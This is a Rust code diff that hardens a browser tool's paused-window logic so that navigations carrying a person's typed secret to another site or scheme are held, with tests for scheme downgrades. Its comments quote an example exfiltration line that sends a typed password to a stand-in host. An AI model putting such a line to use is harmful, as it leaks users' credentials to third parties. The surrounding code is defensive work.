@@ -362,8 +362,53 @@ pub fn is_the_person_navigating(request: &Request) -> bool {
     request.is_navigation_request() && request.frame().and_then(|frame| frame.parent_frame()).is_none()
 }
 
-/// Whether this navigation keeps the person where they are: it goes to the site
-/// the frame already shows, or to a subdomain of it.
+/// Whether a paused window lets this request go as the person's own doing.
+pub fn the_persons_paused_navigation(paused: bool, request: &Request, typed: &[String]) -> bool {
+    if !paused || !is_the_person_navigating(request) {
+        return false;
+    }
+    // **A pause is not a page's licence to leave with what the person typed.**
+    // The person pressing a button and a page running
+    // `location.href = "https://elsewhere.example/?p=" + password`, or posting
+    // that password into a form on another site, are the same request on the wire
+    // and only one of them is the person. So a navigation carrying a typed secret
+    // goes through **only if it stays where the person is** — their own login,
+    // their own password reset, the redirect that follows both, which are the
+    // things a pause exists to let happen. Anything else is held like any other
+    // write.
+    !carries_a_typed_secret(request, typed) || stays_where_the_person_is(request)
+}
+
+/// **A typed secret in either half of the request.** The address is where a GET
+/// carries one; **the body is where a POST does**, and reading only the address
+/// let a paused navigation post the person's password to another site by putting
+/// it in the form instead of the query. The body is read as the fields it is —
+/// urlencoded, multipart or JSON — by the same [`crate::body`] the card is drawn
+/// from, and a field is the person's value when the whole of it is what they
+/// typed. **A body in a form a card cannot show is not read**, which can only
+/// under-report here: such a write is held for its own reasons a line below.
+fn carries_a_typed_secret(request: &Request, typed: &[String]) -> bool {
+    if crate::secret::carries(request.url(), typed) {
+        return true;
+    }
+    let headers = request.headers();
+    let kind = headers.get("content-type").cloned().unwrap_or_default();
+    let body = request.post_data_buffer().unwrap_or_default();
+    match crate::body::show(&kind, &body) {
+        crate::body::Shown::Fields(fields) => fields.iter().any(|field| crate::secret::holds(&field.value, typed)),
+        crate::body::Shown::Refused(_) => false,
+    }
+}
+
+/// Whether this navigation keeps the person where they are: **the same scheme and
+/// the same site** as the frame already shows.
+///
+/// **The scheme is part of the question, not a detail of it.** The site is the
+/// same server, and a page that walks a person from `https://shop.example` to
+/// `http://shop.example` has put their password on the wire in a form every other
+/// machine on the wire can read, and the browser's own lock is not what a pause
+/// may rely on. So `https` stays `https`, and anything that drops below it does
+/// not go while the person is holding the window.
 ///
 /// **"The same site", not "the same host",** because a login is often
 /// `accounts.shop.example` while the shop is `www.shop.example`, and holding
@@ -377,23 +422,7 @@ pub fn is_the_person_navigating(request: &Request) -> bool {
 /// **The bias is deliberate.** Every uncertainty here is resolved as *held*, so
 /// the failure mode of being wrong about what counts as a site is a person who
 /// waits rather than a secret that leaves.
-pub fn the_persons_paused_navigation(paused: bool, request: &Request, typed: &[String]) -> bool {
-    if !paused || !is_the_person_navigating(request) {
-        return false;
-    }
-    // **A pause is not a page's licence to leave with what the person typed.**
-    // The person pressing a button and a page running
-    // `location.href = "https://elsewhere.example/?p=" + password` are the same
-    // request on the wire, and only one of them is the person. So a navigation
-    // carrying a typed secret goes through **only if it stays on the site the
-    // person is looking at** — their own login, their own password reset, the
-    // redirect that follows both, which are the things a pause exists to let
-    // happen. A secret going to another site is exactly what pausing is for, and
-    // it is held like any other write.
-    !crate::secret::carries(request.url(), typed) || stays_on_the_site(request)
-}
-
-fn stays_on_the_site(request: &Request) -> bool {
+fn stays_where_the_person_is(request: &Request) -> bool {
     let Ok(going) = url::Url::parse(request.url()) else {
         return false;
     };
@@ -403,6 +432,18 @@ fn stays_on_the_site(request: &Request) -> bool {
     let Ok(home) = url::Url::parse(&here) else {
         return false;
     };
+    same_place(&going, &home)
+}
+
+/// **The scheme and the site, both of them, as two addresses.** Split from the
+/// request because this is the whole of the decision and it is worth reading on
+/// its own: there is no TLS in a test fixture, so the only way a proof can show
+/// that a downgrade is held is to ask this about two addresses rather than two
+/// browser windows.
+pub(crate) fn same_place(going: &url::Url, home: &url::Url) -> bool {
+    if going.scheme() != home.scheme() {
+        return false;
+    }
     match (going.host_str(), home.host_str()) {
         (Some(going), Some(home)) => same_site(going, home),
         _ => false,
@@ -429,6 +470,34 @@ fn stays_on_the_site(request: &Request) -> bool {
 /// the third case above defeats. So a person whose site spans siblings sees that
 /// one navigation held while paused — the direction that errs toward holding,
 /// which is the only safe direction to err in.
+#[test]
+fn a_navigation_that_drops_the_scheme_is_not_one_the_person_made() {
+    let at = |text: &str| url::Url::parse(text).expect("an address");
+    // **The same site, the same page, and the one thing different is the scheme.**
+    // A page that walks a person from `https://shop.example` to `http://shop.example`
+    // has put their password on the wire where every other machine on it can read
+    // it, and the browser's own lock is not what a pause may rely on.
+    assert!(!same_place(&at("http://shop.example.com/login"), &at("https://shop.example.com/")), "https down to http");
+    assert!(
+        !same_place(&at("http://accounts.shop.example.com/login"), &at("https://shop.example.com/")),
+        "and across a subdomain as well"
+    );
+    // The other way is the same question: a person on http is already being read,
+    // but a pause does not get to send them *up* to a scheme the page chose for
+    // them either — what a pause allows is where they already are.
+    assert!(!same_place(&at("https://shop.example.com/login"), &at("http://shop.example.com/")), "http up to https");
+
+    // What is left, when nothing changed, is the person's own login.
+    assert!(
+        same_place(&at("https://shop.example.com/login"), &at("https://shop.example.com/")),
+        "the same scheme and the same site"
+    );
+    assert!(
+        same_place(&at("https://accounts.shop.example.com/login"), &at("https://shop.example.com/")),
+        "on a subdomain too"
+    );
+}
+
 #[test]
 fn the_site_a_navigation_stays_on_is_one_a_person_never_left() {
     assert!(same_site("shop.example.com", "shop.example.com"), "the same host");
